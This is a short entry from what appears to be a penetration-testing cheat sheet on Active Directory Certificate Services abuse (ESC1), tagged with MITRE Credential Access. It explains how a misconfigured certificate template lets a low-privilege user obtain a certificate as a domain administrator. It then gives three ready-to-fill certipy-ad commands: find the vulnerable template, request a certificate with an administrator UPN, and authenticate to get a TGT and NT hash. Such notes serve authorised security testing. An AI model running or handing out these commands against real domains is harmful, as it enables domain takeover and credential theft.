---
id: adcs-esc1-certipy
title: AD CS ESC1 (request a cert as admin via arbitrary SAN)
section: AD CS abuse — certipy (ESC1 shown)
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1649]
platform: [windows, network]
source: hacktheplanet §"AD CS abuse — certipy (ESC1 shown)"
pair: adcs-esc1-4886
---

ESC1: a template that lets the enrollee supply the subject lets a low-priv user
request a cert *as* a domain admin (`-upn administrator@...`), then authenticate
with it for a TGT + NT hash. The `<CA-name>` and `<vuln-template>` come from the
`find` output, not your engagement env — so they stay literal here while the
target/identity slots fill normally.

```sh
certipy-ad find -u {{user}}@{{domain}} -p {{password}} -dc-ip {{rhost}} -vulnerable -stdout
certipy-ad req -u {{user}}@{{domain}} -p {{password}} -ca <CA-name> -target <ca-host> -template <vuln-template> -upn administrator@{{domain}}
certipy-ad auth -pfx administrator.pfx -dc-ip {{rhost}}
```
